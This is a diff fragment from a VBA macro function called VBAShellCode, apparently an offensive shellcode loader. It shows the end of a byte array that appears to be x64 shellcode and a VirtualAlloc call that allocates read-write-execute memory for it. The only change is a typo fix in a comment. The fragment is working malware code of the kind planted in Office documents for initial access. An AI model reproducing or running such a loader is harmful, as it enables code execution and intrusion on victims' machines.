@@ -18,7 +18,7 @@ Function VBAShellCode()
 72, 49, 201, 65, 186, 88, 164, 83, 229, 255, 213, 72, 137, 195, 73, 137, 199, 77, 49, 201, 73, 137, 240, 72, 137, 218, 72, 137, 249, 65, 186, 2, 217, 200, 95, 255, 213, 131, 248, 0, 125, 40, 88, 65, 87, 89, 104, 0, 64, 0, 0, 65, 88, 106, 0, 90, 65, 186, 11, 47, 15, 48, 255, 213, 87, 89, 65, 186, 117, 110, 77, 97, 255, 213, 73, 255, 206, 233, 60, 255, _
 255, 255, 72, 1, 195, 72, 41, 198, 72, 133, 246, 117, 180, 65, 255, 231, 88, 106, 0, 89, 187, 224, 29, 42, 10, 65, 137, 218, 255, 213)
     
-    'UBound(buf) -> Calculate the size of buf automatically. So no need to set it manually when the payliad is changed
+    'UBound(buf) -> Calculate the size of buf automatically. So no need to set it manually when the payload is changed
     '&H3000 -> MEM_COMMIT and MEM_RESERVE. https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
     '&H40 -> RWX
     addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
